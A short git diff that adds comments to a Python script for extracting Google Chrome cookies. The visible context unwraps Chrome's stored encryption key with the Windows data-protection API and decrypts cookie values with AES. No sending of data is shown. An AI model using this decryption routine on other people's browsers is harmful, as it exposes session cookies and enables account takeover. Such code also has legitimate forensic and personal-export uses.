@@ -9,6 +9,7 @@ from Crypto.Cipher import AES
 
 # cookies extract
 
+# datetime function
 def chrome_datetime(chromedate):
     if chromedate != 86400000000 and chromedate:
         try:
@@ -19,6 +20,7 @@ def chrome_datetime(chromedate):
     else:
         return ""
     
+# encrypt function    
 def encrypt_key():
     state_path = os.path.join(os.environ["USERPROFILE"], 
                                     "AppData", "Local", "Google", "Chrome",
@@ -32,6 +34,7 @@ def encrypt_key():
     
     return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
 
+# decrypt function
 def decrypt_data(data, key):
     try:
         iv = data[3:15]
@@ -86,6 +89,7 @@ def main():
     db.commit()
     # close connection
     db.close()
-    
+
+# main    
 if __name__ == "__main__":
     main()
